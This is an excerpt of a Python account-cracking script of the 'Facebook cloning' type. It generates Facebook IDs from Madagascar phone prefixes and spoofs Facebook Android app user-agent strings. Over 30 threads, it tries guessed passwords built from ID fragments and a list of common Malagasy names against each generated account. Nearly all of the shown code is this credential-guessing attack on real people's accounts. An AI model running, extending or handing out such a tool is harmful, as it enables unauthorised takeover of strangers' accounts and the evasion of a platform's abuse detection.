...
os.system('espeak -b 1000 "welcome jean marc command"')
#──────────────{ LOOP }──────────────#
loop = 0;oks = [];cps = [];id = []
#──────────────{ COLOUR }──────────────#
...
def randBuildLSB():
    ...
    END = '[FBAN/MobileAdsManagerAndroid;FB4A/;FBAV/YZWSES93;FBBV/706655575;FBAN/FB4A;FBAV/YZWSES93;FBBV/706655575;FBDM//*{density=1.5,width=2560,height=2560};FBLC/zh_CN;FBRV/186725268;FBCR/LG;FBMF/Xiaomi;FBBD/LeEco;FBPN/com.facebook.katana;FBDV/Nokia_X120;FBSV/14;FBOP/7;FBCA/armeabi-v7a;FBSS/10;]"+"[FBAN/MobileAdsManagerAndroid;FBAN/;FBAV/YZWSES93;FBBV/516631876;FBAN/FBAN;FBAV/YZWSES93;FBBV/516631876;FBDM//*{density=2.0,width=1080,height=1920};FBLC/ja_JP;FBRV/386708746;FBCR/OPPO;FBMF/OnePlus;FBBD/Nubia;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N400;FBSV/17;FBOP/4;FBCA/arm64-v8a;FBSS/;FB_FW/1;]"+"[FBAN/;FBAV/YZWSES93;FBBV/824462267;FBAN/FBAN;FBAV/YZWSES93;FBBV/824462267;FBDM//*{density=2.0,width=2560,height=1280};FBLC/es_ES;FBRV/998320480;FBCR/Realme;FBMF/Xiaomi;FBBD/Razer;FBPN/com.facebook.katana;FBDV/Oppo_Reno_9;FBSV/16;FBOP/7;FBCA/x86;FBSS/;]"+"[FB4A/;FBAV/4Q095MQG;FBBV/313028293;FBAN/FB4A;FBAV/4Q095MQG;FBBV/313028293;FBDM//*{density=2.0,width=1920,height=3840};FBLC/fr_FR;FBRV/333430354;FBCR/LG;FBMF/VIVO;FBBD/Poco;FBPN/com.facebook.katana;FBDV/Redmi_Note_9;FBSV/15;FBOP/7;FBCA/armeabi-v7a;FBSS/13;]"+"[FB4A/;FBAV/4Q095MQG;FBBV/976564946;FBAN/FB4A;FBAV/4Q095MQG;FBBV/976564946;FBDM//*{density=1.5,width=1440,height=3840};FBLC/de_DE;FBRV/302652186;FBCR/TECNO;FBMF/Motorola;FBBD/Wiko;FBPN/com.facebook.katana;FBDV/HTC_Drive_10;FBSV/12;FBOP/8;FBCA/armeabi-v7a;FBSS/12;]"+"[FB4A/;FBAV/YZWSES93;FBBV/394532439;FBAN/FB4A;FBAV/YZWSES93;FBBV/394532439;FBDM//*{density=3.0,width=1920,height=1920};FBLC/es_ES;FBRV/369324217;FBCR/TECNO;FBMF/Xiaomi;FBBD/Google;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_Mix_13;FBSV/14;FBOP/8;FBCA/armeabi-v7a;FBSS/14;]"+"[FB4A/;FBAV/;FBBV/977661280;FBAN/FB4A;FBAV/;FBBV/977661280;FBDM//*{density=1.5,width=1080,height=4096};FBLC/ja_JP;FBRV/441187011;FBCR/OPPO;FBMF/OnePlus;FBBD/GFive;FBPN/com.facebook.katana;FBDV/Motorola_Moto_E7;FBSV/12;FBOP/4;FBCA/armeabi;FBSS/;]"+"[FBAN/;FBAV/4Q095MQG;FBBV/609612827;FBAN/FBAN;FBAV/4Q095MQG;FBBV/609612827;FBDM//*{density=2.5,width=1440,height=2560};FBLC/fr_FR;FBRV/769368669;FBCR/Sony;FBMF/Motorola;FBBD/iPhone;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F72;FBSV/11;FBOP/4;FBCA/armeabi-v7a;FBSS/;]'
...
def asif():
	...
	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=1.5,width=2560,height=2560}"+f";FBLC/zh_CN;FBRV/186725268;FBCR/LG;FBMF/Xiaomi;FBBD/LeEco;FBPN/com.facebook.katana;FBDV/{model} ;FBSV/14;FBOP/7;FBCA/armeabi-v7a;FBSS/10;]"
	return bal
#vuda
...
def __india__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : +26134 / +26132 / +26133 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
...
def __nepalx__():
    ...
    with ThreadPool(max_workers=30) as Asifx:
        ...
        for love in user:
            ids=code+love
            passlist=[ids,love,ids[:8],ids[:7],ids[:6],'faneva','faniry','tafita','tsiory','tolotra','malala','malalako','jesosy','vadiko','nirina','niaina','rakoto','sahaza','salama','santatra','tahiry','lahatra','larissa','mendrika','mihary','fifalina','fanomezantsoa','fanomezana','sitraka','avotra','nantenaina','tahina','fitahina','fifaliana','fitahiana','anjara','volana','nomenjanahary','nomena','sarika','sariaka','finona','finoana','sarobidy','tiavina','tsilavina','lataka','solofo','tanjona','nekena','narindra','safidy','henintsoa','ravaka','valisoa','tantely','natolotra']
            if methodx in ['1']:Asifx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:Asifx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:Asifx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:Asifx.submit(__Randm_M4__,ids,passlist)
...
def __pakistan__():
    ...
    with ThreadPool(max_workers=30) as Asifx:
        ...
        for love in user:
            ids=code+love
            passlist=[love,ids,'faneva','faniry','tafita','tsiory','tolotra','malala','malalako','jesosy','vadiko','nirina','niaina','rakoto','sahaza','salama','santatra','tahiry','lahatra','larissa','mendrika','mihary','fifalina','fanomezantsoa','fanomezana','sitraka','avotra','nantenaina','tahina','fitahina','fifaliana','fitahiana','anjara','volana','nomenjanahary','nomena','sarika','sariaka','finona','finoana','sarobidy','tiavina','tsilavina','lataka','solofo','tanjona','nekena','narindra','safidy','henintsoa','ravaka','valisoa','tantely','natolotra']
            if methodx in ['1']:Asifx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:Asifx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:Asifx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:Asifx.submit(__Randm_M4__,ids,passlist)
